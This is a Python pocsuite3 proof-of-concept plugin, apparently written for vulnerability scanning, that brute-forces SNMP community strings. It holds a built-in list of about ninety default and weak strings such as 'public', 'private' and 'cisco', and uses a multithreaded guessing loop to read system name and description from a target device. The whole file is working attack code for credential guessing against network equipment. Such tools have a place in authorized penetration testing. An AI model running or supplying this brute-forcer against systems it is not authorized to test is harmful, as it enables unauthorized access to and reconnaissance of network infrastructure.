# -*- coding: utf-8 -*-
# author: seven
# snmp通常使用161端口，通过snmp攻击者可以获取交换机的敏感信息
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
from pocsuite3.lib.core.threads import run_threads
import queue
from pysnmp.hlapi import *


task_queue = queue.Queue()
result_queue = queue.Queue()

snmp_weak_dict = ["public", "private", "0", "1234", "Admin", "CISCO", "CR52401", "IBM", "ILMI", "Intermec", "PRIVATE", "PUBLIC", "Private", "Public", "SECRET", "SECURITY", "SNMP", "SWITCH", "SYSTEM", "Secret", "Security", "Switch", "System", "TEST", "access", "adm", "admin", "agent", "cisco", "community", "default", "guest", "hello", "hp_admin", "ibm", "ilmi", "intermec", "internal", "l2", "l3", "manager", "mngt", "monitor", "netman", "network", "none", "openview", "pass", "password", "pr1v4t3", "proxy", "publ1c", "read", "read-only", "read-write", "readwrite", "red", "regional", "rmon", "rmon_admin", "ro", "root", "router", "rw", "rwa", "san-fran", "sanfran", "scotty", "secret", "security", "seri", "snmp", "snmpd", "snmptrap", "solaris", "sun", "superuser", "switch", "system", "tech", "test", "test2", "trap", "world", "write", "yellow"]


class SNMPWeakPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Jul 11, 2020'
    createDate = 'Jul 11, 2020'
    name = 'snamp弱口令'
    appName = 'snmp'
    appVersion = 'v1.0.0'
    vulType = '弱口令'
    protocol = 'SNMP'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 161
        logger.info('try burst:'+host+':'+str(port))
        snmp_burst(host, port)

        result = {}
        if not result_queue.empty():
            comunity, evidence = result_queue.get()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['comunity'] = comunity
            result['VerifyInfo']['evidence'] = evidence
            result['extra'] = comunity

        return self.parse_output(result)

    def _attack(self):
        return self._verify()


def task_init(host, port):
    for community in snmp_weak_dict:
        task_queue.put((host, port, community.strip()))


def task_thread():
    while not task_queue.empty():
        host, port, community = task_queue.get()
        res, evi = snmp_login(host, port, community)
        if res:
            with task_queue.mutex:
                task_queue.queue.clear()
            result_queue.put((community, evi))


def snmp_burst(host, port):
    if not port_check(host, port):
        return
    try:
        task_init(host, port)
        run_threads(20, task_thread)
    except Exception:
        pass


def port_check(host, port):
    return True


def snmp_login(host, port, community):
    try:
        logger.info('try burst:{}:{}\t{}'.format(host,str(port),community))
        errorIndication, errorStatus, errorIndex, varBinds = next(
            getCmd(SnmpEngine(),
                   # mpModel -> 0:v1,1:v2c
                   CommunityData(community, mpModel=1),
                   UdpTransportTarget((host, int(port)),
                                      timeout=1, retries=1),
                   ContextData(),
                   ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysDescr', 0)),
                   ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysName', 0)))
        )
        if errorIndication:
            return (False, errorIndication)
        elif errorStatus:
            msg = '%s at %s' % (errorStatus.prettyPrint(
            ), errorIndex and varBinds[int(errorIndex) - 1][0] or '?')
            return (False, msg)
        else:
            result = []
            for varBind in varBinds:
                result.append(' = '.join([x.prettyPrint() for x in varBind]))
            return (True, result)
    except Exception as e:
        logger.info(str(e))
        return (False, str(e))


register_poc(SNMPWeakPOC)
